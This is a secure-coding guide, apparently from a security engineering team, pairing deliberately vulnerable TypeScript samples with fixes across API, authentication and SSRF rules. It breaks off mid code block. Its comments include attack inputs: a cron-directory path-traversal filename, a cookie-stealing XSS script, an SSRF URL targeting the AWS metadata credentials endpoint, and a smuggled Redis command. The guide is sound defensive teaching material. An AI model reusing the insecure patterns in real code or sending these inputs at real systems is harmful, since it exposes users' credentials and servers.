# Security Review Best Practices

> **Organization:** Security Engineering
> **Version:** 2.0.0
> **Date:** June 2026

## Abstract

Static Application Security Testing (SAST) guide for web applications and APIs, aligned to OWASP Top 10:2025. Contains 50 rules across 11 categories covering authentication, injection prevention, secrets management, API security, data protection, dependency analysis, error handling, infrastructure hardening, SCA/CVE scanning, SAST tooling, and secure design. All rules are evaluable through static code review — no dynamic scanning required.

## Table of Contents

1. [API Security](#section-1)
2. [Authentication & Authorization](#section-2)
3. [Data Protection & Cryptography](#section-3)
4. [Dependency & Supply Chain Security](#section-4)
5. [Secure Design](#section-5)
6. [Error Handling & Logging](#section-6)
7. [Infrastructure & HTTP Hardening](#section-7)
8. [Input Validation & Injection Prevention](#section-8)
9. [Static Application Security Testing & Code Analysis](#section-9)
10. [Software Composition Analysis & CVE Scanning](#section-10)
11. [Secrets & Credentials Management](#section-11)

---

## 1. API Security {#section-1}

**Impact:** HIGH
**Description:** APIs are the primary attack surface for modern applications. Rate limiting, CORS, schema validation, HTTPS enforcement, secure file uploads, and idempotency are essential first lines of defense.

## Configure CORS to Allow Only Trusted Origins

**Impact: HIGH — CWE-346**

Misconfigured CORS allows malicious websites to make authenticated cross-origin requests to your API on behalf of users (reading data, triggering actions). A wildcard `Access-Control-Allow-Origin: *` with `credentials: true` is a critical misconfiguration — browsers block it, but some setups inadvertently reflect the request origin, which has the same effect.

**Vulnerable (wildcard or reflected origin):**

```typescript
// ❌ Wildcard — any website can call your API cross-origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*')
  res.header('Access-Control-Allow-Credentials', 'true')  // browsers block this combination
  next()
})

// ❌ Reflecting any Origin header — effectively a wildcard
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin)  // dangerous!
  res.header('Access-Control-Allow-Credentials', 'true')
  next()
})

// ❌ Weak origin validation — attacker uses evil.myapp.com
const origin = req.headers.origin
if (origin.includes('myapp.com')) {  // substring match is bypassable
  res.header('Access-Control-Allow-Origin', origin)
}
```

**Secure (explicit allowlist with exact match):**

```typescript
import cors from 'cors'

// ✅ Explicit origin allowlist — exact string match
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://www.example.com',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null,
].filter(Boolean) as string[])

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (curl, mobile apps, Postman)
    if (!origin) return callback(null, true)
    if (ALLOWED_ORIGINS.has(origin)) {
      callback(null, true)
    } else {
      callback(new Error(`CORS: origin not allowed: ${origin}`))
    }
  },
  credentials: true,              // required for cookies/auth headers
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,                  // cache preflight for 24h
}

app.use(cors(corsOptions))

// ✅ For public APIs (no credentials), wildcard is safe
const publicCors = cors({ origin: '*', credentials: false })
app.use('/api/public', publicCors)
```

For APIs that only serve your own frontend, use `SameSite=Strict` cookies instead of CORS-allowed cross-origin requests. Never combine `credentials: true` with `origin: '*'`.

Reference: [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html)

---

## Secure File Upload Handling

**Impact: HIGH — CWE-434**

Unrestricted file uploads are one of the most dangerous vulnerabilities — they can lead to remote code execution (uploading web shells), stored XSS (uploading HTML/SVG with scripts), denial of service (uploading enormous files), and path traversal (overwriting critical files). The client-provided filename and MIME type cannot be trusted — attackers rename `shell.php` to `shell.jpg` and set the Content-Type to `image/jpeg`.

**Vulnerable (trusting client-provided file metadata):**

```typescript
// ❌ Trusting filename, MIME type, and size from the client
import multer from 'multer'

const upload = multer({
  dest: 'public/uploads/',  // Stored in publicly accessible directory!
  // No file size limit
  // No file type validation
})

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file!
  // ❌ Using original filename — path traversal: "../../../etc/cron.d/backdoor"
  const finalPath = `public/uploads/${file.originalname}`
  await fs.rename(file.path, finalPath)

  // File is now served at https://app.com/uploads/malicious.html
  // If it contains <script>alert(document.cookie)</script> → stored XSS
  res.json({ url: `/uploads/${file.originalname}` })
})
```

**Secure (validated uploads with safe storage):**

```typescript
import multer from 'multer'
import { fileTypeFromBuffer } from 'file-type'
import crypto from 'crypto'
import path from 'path'

// ✅ Strict file size limit
const upload = multer({
  dest: '/tmp/uploads/',                  // Temporary staging — NOT public
  limits: { fileSize: 5 * 1024 * 1024 },  // 5MB max
})

const ALLOWED_TYPES = new Map([
  ['image/jpeg', '.jpg'],
  ['image/png', '.png'],
  ['image/webp', '.webp'],
  ['application/pdf', '.pdf'],
])

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file!

  // ✅ Step 1: Validate MIME type by reading magic bytes (not trusting headers)
  const buffer = await fs.readFile(file.path)
  const detected = await fileTypeFromBuffer(buffer)

  if (!detected || !ALLOWED_TYPES.has(detected.mime)) {
    await fs.unlink(file.path)  // Clean up rejected file
    return res.status(400).json({ error: 'File type not allowed' })
  }

  // ✅ Step 2: Generate a safe random filename (ignore client filename entirely)
  const safeFilename = `${crypto.randomUUID()}${ALLOWED_TYPES.get(detected.mime)}`

  // ✅ Step 3: Store outside the webroot — serve via a controller, not static files
  const storagePath = path.join('/var/app/storage/uploads', safeFilename)
  await fs.rename(file.path, storagePath)

  // ✅ Step 4: Store metadata in database, serve through an authenticated endpoint
  const record = await db.uploads.create({
    id: crypto.randomUUID(),
    filename: safeFilename,
    originalName: file.originalname,
    mimeType: detected.mime,
    size: file.size,
    uploadedBy: req.user.id,
  })

  res.json({ id: record.id, url: `/api/files/${record.id}` })
})
```

Never trust client-provided filenames or MIME types. Validate file types by reading magic bytes. Store uploads outside the webroot. Generate random filenames. Serve files through authenticated controllers with proper `Content-Type` and `Content-Disposition` headers.

Reference: [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

---

## Enforce HTTPS and Set HTTP Strict Transport Security (HSTS)

**Impact: HIGH — CWE-319**

Plaintext HTTP exposes all traffic — credentials, session tokens, and data — to network-level interception (MITM attacks). HSTS tells browsers to only connect via HTTPS, preventing downgrade attacks even when a user types `http://`. Redirect all HTTP traffic to HTTPS server-side.

**Vulnerable (HTTP allowed, no HSTS):**

```typescript
// ❌ No redirect from HTTP to HTTPS
app.listen(80)  // serves plaintext HTTP

// ❌ No HSTS header — browser may use HTTP first
app.get('/', (req, res) => {
  res.send('Hello')  // no HSTS header set
})
```

**Secure (HTTPS-only with HSTS):**

```typescript
import helmet from 'helmet'
import express from 'express'

const app = express()

// ✅ Force HTTPS redirect — HTTP → HTTPS
app.use((req, res, next) => {
  if (
    process.env.NODE_ENV === 'production' &&
    req.headers['x-forwarded-proto'] !== 'https'
  ) {
    return res.redirect(301, `https://${req.headers.host}${req.url}`)
  }
  next()
})

// ✅ HSTS — strict transport security with long max-age and subdomains
app.use(helmet.hsts({
  maxAge:            365 * 24 * 60 * 60,  // 1 year (recommended: 2 years)
  includeSubDomains: true,
  preload:           true,                // submit to HSTS preload list
}))

// ✅ Full helmet setup (includes HSTS + other security headers)
app.use(helmet())

// ✅ NGINX config — redirect HTTP and set HSTS
// server {
//   listen 80;
//   return 301 https://$host$request_uri;
// }
// server {
//   listen 443 ssl;
//   add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";
//   ssl_protocols TLSv1.2 TLSv1.3;
//   ssl_prefer_server_ciphers off;
// }
```

Submit your domain to the [HSTS preload list](https://hstspreload.org) for the strongest protection. Use TLS 1.2+ only — disable TLS 1.0 and 1.1. Obtain certificates from Let's Encrypt (free) or your CA.

Reference: [OWASP Transport Layer Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)

---

## Use Idempotency Keys for Mutating Endpoints

**Impact: HIGH — CWE-20**

Without idempotency protection, network retries, client bugs, or user double-clicks can cause duplicate payments, double order submissions, or repeated side effects. An idempotency key is a client-generated unique identifier sent with each request — the server processes the request once and returns the cached response for subsequent calls with the same key. This prevents financial loss, data corruption, and user frustration.

**Vulnerable (no idempotency — duplicate processing):**

```typescript
// ❌ No idempotency — retried requests charge the customer twice
app.post('/api/payments', async (req, res) => {
  const { amount, currency, customerId } = req.body

  // If the network drops after charging but before the response reaches the client,
  // the client retries → customer is charged twice
  const charge = await stripe.charges.create({
    amount,
    currency,
    customer: customerId,
  })

  await db.payments.insert({
    chargeId: charge.id,
    amount,
    customerId,
  })

  res.json({ success: true, chargeId: charge.id })
})
```

**Secure (idempotency key with server-side deduplication):**

```typescript
// ✅ Idempotency key prevents duplicate processing
app.post('/api/payments', async (req, res) => {
  const idempotencyKey = req.headers['idempotency-key'] as string

  if (!idempotencyKey) {
    return res.status(400).json({ error: 'Idempotency-Key header is required' })
  }

  // Check if this key was already processed
  const existing = await db.idempotencyKeys.findOne({
    key: idempotencyKey,
    endpoint: '/api/payments',
  })

  if (existing) {
    // Return the cached response — no side effects executed
    return res.status(existing.statusCode).json(existing.responseBody)
  }

  // Process the request (first time with this key)
  const { amount, currency, customerId } = req.body
  const charge = await stripe.charges.create({
    amount,
    currency,
    customer: customerId,
    idempotencyKey,  // Stripe also supports idempotency natively
  })

  const response = { success: true, chargeId: charge.id }

  // Cache the response for this idempotency key (TTL: 24 hours)
  await db.idempotencyKeys.insert({
    key: idempotencyKey,
    endpoint: '/api/payments',
    statusCode: 200,
    responseBody: response,
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),
  })

  res.json(response)
})
```

Require `Idempotency-Key` headers on all `POST`/`PUT`/`PATCH` endpoints that have side effects (payments, orders, notifications). Set TTLs on stored keys (24-48 hours) to prevent unbounded storage growth.

Reference: [IETF Idempotency-Key Header RFC](https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/)

---

## Apply Rate Limiting and Throttling on All Endpoints

**Impact: HIGH — CWE-770**

Without rate limiting, attackers can brute-force passwords, enumerate accounts, scrape data, or overwhelm your service. Rate limiting is especially critical on authentication endpoints, password reset, and any resource-expensive operation. Apply different limits per endpoint type.

**Vulnerable (no rate limiting):**

```typescript
// ❌ No limit — attacker can try millions of passwords
app.post('/auth/login', async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password)
  if (!user) return res.status(401).json({ error: 'Invalid credentials' })
  res.json({ token: issueToken(user) })
})

// ❌ Password reset — attacker enumerates valid emails at will
app.post('/auth/forgot-password', async (req, res) => {
  await sendResetEmail(req.body.email)
  res.json({ success: true })
})
```

**Secure (tiered rate limiting per endpoint sensitivity):**

```typescript
import rateLimit from 'express-rate-limit'
import RedisStore from 'rate-limit-redis'
import { createClient } from 'redis'

const redis = createClient({ url: process.env.REDIS_URL })
await redis.connect()

// ✅ Strict limit for auth endpoints — per IP
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                    // 10 attempts per 15 min per IP
  standardHeaders: true,
  legacyHeaders: false,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
  message: { error: 'Too many login attempts, try again in 15 minutes' },
})

// ✅ General API limit — per authenticated user
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,       // 1 minute
  max: 100,                  // 100 requests/min per IP
  keyGenerator: (req) => req.user?.id || req.ip,  // per-user when authenticated
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
})

// ✅ Apply tiered limits
app.post('/auth/login',            authLimiter, loginHandler)
app.post('/auth/forgot-password',  authLimiter, forgotPasswordHandler)
app.post('/auth/register',         authLimiter, registerHandler)
app.use('/api',                    apiLimiter)

// ✅ Account lockout after N failed attempts (complement to rate limiting)
async function trackFailedLogin(userId: string) {
  const key = `failed_logins:${userId}`
  const attempts = await redis.incr(key)
  await redis.expire(key, 15 * 60)  // 15 min window
  if (attempts >= 5) {
    await db.users.update({ where: { id: userId }, data: { lockedUntil: new Date(Date.now() + 15 * 60 * 1000) } })
  }
}
```

Use Redis-backed stores so rate limits survive process restarts and work across multiple instances. Add Captcha for high-value auth endpoints as a second layer.

Reference: [OWASP Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

---

## Validate Request Body and Query Parameters Against a Schema

**Impact: HIGH — CWE-20**

Unvalidated API requests allow attackers to send unexpected types, oversized payloads, or additional fields that bypass business logic, cause prototype pollution, or trigger mass assignment vulnerabilities. Schema validation enforces the contract between client and server and rejects malformed requests early.

**Vulnerable (no schema validation):**

```typescript
// ❌ No validation — attacker sends { isAdmin: true, price: -100 }
app.post('/api/products', requireAuth, async (req, res) => {
  const product = await db.products.create({ data: req.body })  // mass assignment!
  res.json(product)
})

// ❌ No query param validation — type coercion issues
app.get('/api/search', async (req, res) => {
  const { q, limit } = req.query
  const results = await db.products.findMany({ where: { name: { contains: q } }, take: limit })
})
```

**Secure (Zod schema per endpoint):**

```typescript
import { z } from 'zod'
import { Request, Response, NextFunction } from 'express'

// ✅ Middleware factory for schema validation
function validateBody<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body)
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.error.flatten(),
      })
    }
    req.body = result.data  // replace with validated + typed data
    next()
  }
}

function validateQuery<T>(schema: z.ZodSchema<T>) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.query)
    if (!result.success) {
      return res.status(400).json({ error: 'Invalid query', details: result.error.flatten() })
    }
    req.query = result.data as any
    next()
  }
}

// ✅ Strict schema — only allowed fields pass through (no mass assignment)
const CreateProductSchema = z.object({
  name:        z.string().min(1).max(200),
  description: z.string().max(2000).optional(),
  price:       z.number().positive().max(1_000_000),
  categoryId:  z.string().uuid(),
  // isAdmin, internalId, etc. are NOT in the schema — stripped automatically
})

const SearchSchema = z.object({
  q:      z.string().max(100).optional(),
  limit:  z.coerce.number().int().min(1).max(100).default(20),
  offset: z.coerce.number().int().min(0).default(0),
})

app.post('/api/products',
  requireAuth,
  requireRole('seller'),
  validateBody(CreateProductSchema),
  async (req, res) => {
    const product = await db.products.create({
      data: { ...req.body, sellerId: req.user.id }  // ✅ sellerId from session, not body
    })
    res.json(product)
  }
)

app.get('/api/search', validateQuery(SearchSchema), async (req, res) => {
  const { q, limit, offset } = req.query as z.infer<typeof SearchSchema>
  const results = await db.products.findMany({
    where: q ? { name: { contains: q, mode: 'insensitive' } } : {},
    take: limit,
    skip: offset,
  })
  res.json(results)
})
```

Zod's `safeParse` strips unknown keys by default. Never spread `req.body` directly into a database create/update — always extract only the fields your schema defines.

Reference: [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

## 2. Authentication & Authorization {#section-2}

**Impact:** CRITICAL
**Description:** Broken authentication and access control are the #1 and #2 most critical web vulnerabilities (OWASP A01/A07). Flaws here lead directly to account takeover, privilege escalation, SSRF, and full data breach.

## Fully Validate JWT Signature, Algorithm, and Claims

**Impact: CRITICAL — CWE-347**

JWTs must be validated on every request: verify the signature, reject the `none` algorithm, enforce `alg` allowlist, and check `exp`, `iss`, and `aud` claims. Skipping any step allows attackers to forge tokens, elevate privileges, or reuse expired tokens.

**Vulnerable (incomplete validation):**

```typescript
// ❌ Only decodes — does NOT verify signature
import jwt from 'jsonwebtoken'
const payload = jwt.decode(token) // trusts token blindly

// ❌ Accepts 'none' algorithm — attacker can forge any payload
const payload = jwt.verify(token, secret) // if alg not locked down

// ❌ No expiry, issuer, or audience check
const payload = jwt.verify(token, secret, {})
```

**Secure (strict validation with allowlist):**

```typescript
import jwt from 'jsonwebtoken'

const JWT_SECRET  = process.env.JWT_SECRET!
const JWT_ISSUER  = 'https://auth.example.com'
const JWT_AUDIENCE = 'https://api.example.com'

function verifyToken(token: string): JwtPayload {
  // ✅ Allowlist algorithm — rejects 'none' and RS256/HS256 confusion
  const payload = jwt.verify(token, JWT_SECRET, {
    algorithms: ['HS256'],   // explicit allowlist only
    issuer:    JWT_ISSUER,
    audience:  JWT_AUDIENCE,
    // exp is checked automatically by jsonwebtoken
  })
  return payload as JwtPayload
}

// ✅ Use on every protected route
app.get('/api/resource', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '')
  if (!token) return res.status(401).json({ error: 'Unauthorized' })
  try {
    const payload = verifyToken(token)
    req.user = payload
    next()
  } catch {
    return res.status(401).json({ error: 'Invalid token' })
  }
})
```

Never trust `jwt.decode()` for authorization. Always specify an algorithm allowlist. Validate `iss` and `aud` to prevent token reuse across services.

Reference: [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## Enforce MFA for Privileged and Sensitive Operations

**Impact: HIGH — CWE-308**

Multi-factor authentication (MFA) dramatically reduces the risk of account takeover even when passwords are compromised. MFA should be mandatory for admin roles and strongly encouraged for all users. Step-up authentication (requiring MFA for specific high-risk actions) protects sensitive operations without constant friction.

**Vulnerable (password-only auth for admin actions):**

```typescript
// ❌ Admin action gated only by JWT role — no second factor
app.post('/api/admin/users/:id/delete', requireRole('admin'), async (req, res) => {
  await db.users.delete({ where: { id: req.params.id } })
  res.json({ success: true })
})
```

**Secure (TOTP-based MFA + step-up for sensitive actions):**

```typescript
import speakeasy from 'speakeasy'
import QRCode from 'qrcode'

// ✅ Enroll MFA — generate TOTP secret
app.post('/api/mfa/enroll', requireAuth, async (req, res) => {
  const secret = speakeasy.generateSecret({ name: `MyApp (${req.user.email})` })
  await db.users.update({
    where: { id: req.user.id },
    data: { mfaSecret: encrypt(secret.base32), mfaEnabled: false },
  })
  const qr = await QRCode.toDataURL(secret.otpauth_url!)
  res.json({ qr, secret: secret.base32 })
})

// ✅ Confirm enrollment
app.post('/api/mfa/confirm', requireAuth, async (req, res) => {
  const { token } = req.body
  const user = await db.users.findById(req.user.id)
  const verified = speakeasy.totp.verify({
    secret: decrypt(user.mfaSecret),
    encoding: 'base32',
    token,
    window: 1,
  })
  if (!verified) return res.status(400).json({ error: 'Invalid MFA code' })
  await db.users.update({ where: { id: user.id }, data: { mfaEnabled: true } })
  res.json({ success: true })
})

// ✅ Step-up middleware for sensitive endpoints
function requireMfaVerified(req: Request, res: Response, next: NextFunction) {
  if (!req.user.mfaVerifiedAt) {
    return res.status(403).json({ error: 'MFA verification required', code: 'MFA_REQUIRED' })
  }
  const tenMinutesAgo = Date.now() - 10 * 60 * 1000
  if (req.user.mfaVerifiedAt < tenMinutesAgo) {
    return res.status(403).json({ error: 'MFA session expired', code: 'MFA_EXPIRED' })
  }
  next()
}

app.post('/api/admin/users/:id/delete',
  requireAuth,
  requireRole('admin'),
  requireMfaVerified,  // ✅ requires recent MFA verification
  async (req, res) => {
    await db.users.delete({ where: { id: req.params.id } })
    res.json({ success: true })
  }
)
```

Use TOTP (RFC 6238) as the primary second factor. Provide backup codes. Consider hardware keys (FIDO2/WebAuthn) for admin accounts. Never allow MFA bypass via SMS for high-security contexts (SIM-swap attacks).

Reference: [OWASP Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)

---

## Use state and PKCE in OAuth/OIDC Flows

**Impact: CRITICAL — CWE-352 / CWE-601**

OAuth flows without `state` parameter are vulnerable to CSRF attacks that can link an attacker's account to a victim's session. Without PKCE (Proof Key for Code Exchange), authorization codes can be intercepted and exchanged by a malicious app. Both mitigations are required for public clients and SPAs.

**Vulnerable (no state, no PKCE):**

```typescript
// ❌ No state parameter — CSRF attack can link attacker account to victim
const authUrl = `https://provider.com/oauth/authorize
  ?client_id=${CLIENT_ID}
  &redirect_uri=${REDIRECT_URI}
  &response_type=code`
res.redirect(authUrl)

// ❌ Callback accepts any code without verifying state
app.get('/callback', async (req, res) => {
  const { code } = req.query
  const tokens = await exchangeCode(code) // no state check!
})
```

**Secure (state + PKCE):**

```typescript
import crypto from 'crypto'

// ✅ Generate and store state + PKCE verifier
app.get('/auth/login', (req, res) => {
  const state         = crypto.randomBytes(32).toString('hex')
  const codeVerifier  = crypto.randomBytes(64).toString('base64url')
  const codeChallenge = crypto
    .createHash('sha256')
    .update(codeVerifier)
    .digest('base64url')

  // Store in server-side session (not cookie directly)
  req.session.oauthState        = state
  req.session.oauthCodeVerifier = codeVerifier

  const authUrl = new URL('https://provider.com/oauth/authorize')
  authUrl.searchParams.set('client_id',             CLIENT_ID)
  authUrl.searchParams.set('redirect_uri',          REDIRECT_URI)
  authUrl.searchParams.set('response_type',         'code')
  authUrl.searchParams.set('state',                 state)
  authUrl.searchParams.set('code_challenge',        codeChallenge)
  authUrl.searchParams.set('code_challenge_method', 'S256')
  res.redirect(authUrl.toString())
})

// ✅ Verify state before exchanging code
app.get('/callback', async (req, res) => {
  const { code, state } = req.query
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state — possible CSRF' })
  }
  const tokens = await exchangeCode(code, req.session.oauthCodeVerifier)
  delete req.session.oauthState
  delete req.session.oauthCodeVerifier
  // proceed with tokens
})
```

Always validate redirect URIs against an exact allowlist on the authorization server. Never use wildcard redirect URIs.

Reference: [OWASP OAuth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)

---

## Use bcrypt or Argon2 for Password Hashing

**Impact: CRITICAL — CWE-916**

Passwords must never be stored in plaintext or with fast hash functions (MD5, SHA-1, SHA-256). Fast hashes allow attackers to crack millions of passwords per second with GPU hardware after a database breach. bcrypt, Argon2id, or scrypt are intentionally slow and memory-hard, making brute-force infeasible.

**Vulnerable (plaintext or weak hash):**

```typescript
// ❌ Storing plaintext password
await db.users.create({ email, password: plaintext })

// ❌ Fast hash — cracks at ~10 billion/sec on modern GPU
import { createHash } from 'crypto'
const hash = createHash('sha256').update(password).digest('hex')
await db.users.create({ email, password: hash })
```

**Secure (Argon2id — recommended, or bcrypt):**

```typescript
import argon2 from 'argon2'

// ✅ Hash on registration
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,  // 64 MB
  timeCost: 3,
  parallelism: 4,
})
await db.users.create({ email, passwordHash: hash })

// ✅ Verify on login
const isValid = await argon2.verify(user.passwordHash, password)
if (!isValid) throw new AuthError('Invalid credentials')

// ✅ Alternative: bcrypt (cost factor >= 12)
import bcrypt from 'bcrypt'
const hash = await bcrypt.hash(password, 12)
const isValid = await bcrypt.compare(password, user.passwordHash)
```

Use Argon2id as the first choice (winner of Password Hashing Competition). Use bcrypt with cost ≥ 12 as a widely-supported alternative. Never use MD5, SHA-1, SHA-2, or any unsalted hash for passwords.

Reference: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

## Enforce Role-Based Access Control on Every Endpoint

**Impact: CRITICAL — CWE-285**

Authorization must be checked server-side on every request. Never rely on the UI to hide privileged actions. Broken access control (OWASP #1) allows attackers to access other users' data, perform admin actions, or escalate privileges simply by changing a URL or role claim.

**Vulnerable (no server-side authorization):**

```typescript
// ❌ Only the frontend hides the admin button — no server check
app.delete('/api/users/:id', async (req, res) => {
  await db.users.delete({ where: { id: req.params.id } })
  res.json({ success: true })
})

// ❌ Trusting a role from the client request body
app.post('/api/report', async (req, res) => {
  if (req.body.role === 'admin') {  // attacker controls this!
    return sendFullReport(res)
  }
})

// ❌ IDOR — user can access any user's data by changing the ID
app.get('/api/profile/:userId', async (req, res) => {
  const user = await db.users.findById(req.params.userId)
  res.json(user)
})
```

**Secure (server-side RBAC middleware + ownership check):**

```typescript
// ✅ Reusable role-check middleware
function requireRole(...roles: Role[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user) return res.status(401).json({ error: 'Unauthenticated' })
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' })
    }
    next()
  }
}

// ✅ Admin-only route — checked server-side
app.delete('/api/users/:id', requireAuth, requireRole('admin'), async (req, res) => {
  await db.users.delete({ where: { id: req.params.id } })
  res.json({ success: true })
})

// ✅ Ownership check — user can only access their own data
app.get('/api/profile/:userId', requireAuth, async (req, res) => {
  if (req.params.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' })
  }
  const user = await db.users.findById(req.params.userId)
  res.json(user)
})
```

Apply authorization middleware before route handlers, not inside them. Check resource ownership for every user-scoped operation. Log all authorization failures for monitoring.

Reference: [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)

---

## Use Secure, HttpOnly, SameSite Session Cookies

**Impact: CRITICAL — CWE-614**

Session cookies without `HttpOnly` can be stolen via XSS. Without `Secure`, they travel over plaintext HTTP. Without `SameSite=Strict` or `Lax`, they are sent on cross-site requests enabling CSRF attacks. All three attributes are required.

**Vulnerable (missing cookie security attributes):**

```typescript
// ❌ Cookie readable by JavaScript — XSS can steal session
res.cookie('sessionId', token)

// ❌ No Secure flag — sent over HTTP
res.cookie('sessionId', token, { httpOnly: true })

// ❌ No SameSite — CSRF vulnerable
res.cookie('sessionId', token, { httpOnly: true, secure: true })
```

**Secure (all required attributes set):**

```typescript
// ✅ Full session cookie security
res.cookie('sessionId', token, {
  httpOnly: true,            // not accessible via document.cookie
  secure: true,              // only sent over HTTPS
  sameSite: 'strict',        // blocks CSRF entirely for same-origin
  maxAge: 15 * 60 * 1000,   // 15 minutes; use 'session' for browser-session cookies
  path: '/',
})

// ✅ For cross-site APIs (e.g., embedded widgets), use 'none' + secure
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'none',          // required for cross-site; must be secure: true
  maxAge: 15 * 60 * 1000,
})

// ✅ Express session library example
app.use(session({
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,
  },
}))
```

Set `secure: true` in production always. Use `SameSite=Strict` unless you explicitly need cross-site cookie delivery. Rotate session IDs after privilege changes (login, role change).

Reference: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

## Prevent Server-Side Request Forgery with URL Allowlists

**Impact: CRITICAL — CWE-918**

Server-Side Request Forgery (SSRF) occurs when an application fetches a URL provided by the user without validating the destination. Attackers exploit this to access internal services (metadata APIs, databases, admin panels), scan private networks, or exfiltrate data through the server. SSRF was OWASP A10 in 2021 and remains a top threat — the 2019 Capital One breach was caused by SSRF targeting the AWS metadata endpoint.

**Vulnerable (unvalidated URL from user input):**

```typescript
// ❌ Fetches any URL the user provides — including internal services
app.post('/api/preview', async (req, res) => {
  const { url } = req.body

  // Attacker sends: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  // → Server fetches AWS IAM credentials and returns them to the attacker

  // Attacker sends: url = "http://10.0.0.5:6379/CONFIG+SET+dir+/var/www/html"
  // → Server sends commands to internal Redis

  const response = await fetch(url)
  const html = await response.text()
  res.json({ preview: html })
})

// ❌ DNS rebinding bypasses hostname checks
// Attacker's DNS returns 1.2.3.4 on first lookup (passes validation)
// then 169.254.169.254 on second lookup (actual fetch hits metadata API)
```

**Secure (URL allowlist with IP validation):**

```typescript
import { URL } from 'url'
import dns from 'dns/promises'
import ipaddr from 'ipaddr.js'

// ✅ Allowlist of permitted domains
const ALLOWED_HOSTS = new Set(['api.example.com', 'cdn.example.com', 'images.example.com'])

// ✅ Block private/internal IP ranges
function isPrivateIP(ip: string): boolean {
  try {
    const addr = ipaddr.parse(ip)
    const range = addr.range()
    return ['private', 'loopback', 'linkLocal', 'uniqueLocal', 'unspecified'].includes(range)
  } catch {
    return true  // Block unparseable addresses
  }
}

app.post('/api/preview', async (req, res) => {
  const { url: userUrl } = req.body

  // Step 1: Parse and validate URL scheme
  const parsed = new URL(userUrl)
  if (!['https:'].includes(parsed.protocol)) {
    return res.status(400).json({ error: 'Only HTTPS URLs are allowed' })
  }

  // Step 2: Check hostname against allowlist
  if (!ALLOWED_HOSTS.has(parsed.hostname)) {
    return res.status(400).json({ error: 'Domain not in allowlist' })
  }

  // Step 3: Resolve DNS and check for private IPs (prevents DNS rebinding)
  const addresses = await dns.resolve4(parsed.hostname)
  if (addresses.some(isPrivateIP)) {
    return res.status(400).json({ error: 'Blocked: target resolves to private IP' })
  }

  // Step 4: Fetch with redirect disabled (prevents redirect to internal URLs)
  const response = await fetch(userUrl, { redirect: 'error' })
  const html = await response.text()
  res.json({ preview: html.substring(0, 10000) })  // Limit response size
})
```

Never allow user-controlled URLs to reach internal networks. Use domain allowlists, resolve DNS before fetching, block private IP ranges, and disable HTTP redirects on server-side HTTP clients.

Reference: [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## Use Short-Lived Access Tokens with Rotating Refresh Tokens

**Impact: CRITICAL — CWE-613**

Long-lived access tokens give attackers a large window to exploit a stolen token. Access tokens should expire in minutes (15 min max). Refresh tokens should be single-use with rotation — when a refresh token is used, issue a new one and invalidate the old. This limits blast radius and detects token theft (reuse of a rotated token signals compromise).

**Vulnerable (long-lived non-rotating tokens):**

```typescript
// ❌ Token valid for 30 days — stolen token compromises account for weeks
const token = jwt.sign({ userId: user.id }, JWT_SECRET, {
  expiresIn: '30d',
})
res.json({ token })

// ❌ Refresh tokens never invalidated — reuse undetected
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body
